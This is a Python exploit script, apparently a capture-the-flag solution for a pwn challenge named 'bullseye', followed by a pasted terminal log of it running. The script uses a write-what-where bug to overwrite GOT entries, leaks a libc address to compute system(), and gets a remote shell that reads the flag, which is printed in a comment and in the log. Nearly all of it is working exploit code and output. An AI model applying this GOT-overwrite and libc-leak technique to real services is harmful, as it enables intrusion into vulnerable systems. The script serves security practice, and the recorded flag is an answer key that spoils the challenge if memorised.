from roppy import *
from time import sleep

# flag{one_write_two_write_good_write_bad_write}

HOST = "jh2i.com"
PORT = 50031


libc = ELF("libc6_2.30-0ubuntu2.1_amd64.so")
exit_got  = "0x404058"
sleep_got = "0x404060"
main      = "0x401260"
read_got  = "0x404038"

p = remote(HOST, PORT)

def send_data(where, what):
        p.sendlineafter("?\n", where)
        p.sendlineafter("?\n", what)


send_data(exit_got, main)
sleep(0xf)
alarm = int(p.recvline().strip(b"\n"), 16)
log.info("alarm:  0x%x" %(alarm))
libc.address = alarm - libc.function("alarm")
log.info("LIBC  :  0x%x" %(libc.address))
log.info("system:  0x%x" %(libc.function("system")))
send_data(sleep_got, main)

send_data("0x404040", hex(libc.function("system")))

'''
0 [07:40:13] vagrant@oracle(oracle) pwn> python3 bullseye.py 
[*] Analyzing /home/vagrant/CTFs/hacktivity/pwn/libc6_2.30-0ubuntu2.1_amd64.so
[+] Opening connection to jh2i.com on port 50031: Done
[*] alarm:  0x7fbca7ea8be0
[*] LIBC  :  0x7fbca7dc3000
[*] system:  0x7fbca7e184e0
[*] Paused [Press any key to continue]
[*] Switching to interactive mode
You have one write, don't miss.

Where do you want to write to?
$ /bin/sh
$ cat flag.txt
flag{one_write_two_write_good_write_bad_write}
$ exit
sh: 2: �@: not found
What do you want to write?
[*] Got EOF while reading in interactive
$ 
$ 
$ 
[*] Interrupted
[*] Closed connection to jh2i.com port 50031
'''

p.interactive()
